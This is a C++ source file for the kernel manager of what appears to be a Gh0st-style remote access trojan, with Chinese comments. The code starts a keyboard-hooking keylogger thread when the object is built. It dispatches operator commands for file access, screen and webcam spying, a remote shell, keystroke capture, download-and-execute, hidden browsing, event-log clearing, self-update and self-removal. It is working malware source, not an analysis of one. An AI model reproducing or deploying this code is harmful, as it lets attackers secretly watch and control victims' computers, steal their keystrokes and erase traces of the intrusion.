// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////


#include "KernelManager.h"
#include "loop.h"
#include "until.h"
#include <Shlwapi.h>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	if (lpszServiceName != NULL)
	{
		lstrcpy(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;

	m_nThreadCount = 0;
	// 创建一个监视键盘记录的线程
	// 键盘HOOK跟UNHOOK必须在同一个线程中
	m_hThread[m_nThreadCount++] = 
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);

}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_DRIVE: // 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // 屏幕查看
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_WEBCAM: // 摄像头
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHELL: // 远程sehll
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSTEM: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;

	case COMMAND_DOWN_EXEC: // 下载者
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		Sleep(100); // 传递参数用
		break;
	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // 卸载,
		UnInstallService();
		break;
	case COMMAND_CLEAN_EVENT: // 清除日志
		CleanEvent();
		break;
	case COMMAND_SESSION:
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK:
		SetHostID((LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_UPDATE_SERVER: // 更新服务端
		if (UpdateServer((LPCTSTR)(lpBuffer + 1)))
			UnInstallService();
		break;	
	}	
}

void CKernelManager::UnInstallService()
{
	char	key[1024], strServiceDll[MAX_PATH];
	memset(key, 0, sizeof(key));
	wsprintf(key, "SYSTEM\\CurrentControlSet\\Services\\%s", m_strServiceName);
	SHDeleteKey(HKEY_LOCAL_MACHINE, key);
	
	CreateEvent(NULL, true, false, m_strKillEvent);


	GetSystemDirectory(strServiceDll, sizeof(strServiceDll));
	lstrcat(strServiceDll, "\\");
	lstrcat(strServiceDll, m_strServiceName);
	lstrcat(strServiceDll, "ex.dll");
	MoveFileEx(strServiceDll, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	char	strIDFile[MAX_PATH];
	GetSystemDirectory(strIDFile, sizeof(strIDFile));
	lstrcat(strIDFile, "\\user.dat");
	DeleteFile(strIDFile);


	char	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, "\\syslog.dat");
	DeleteFile(strRecordFile);
}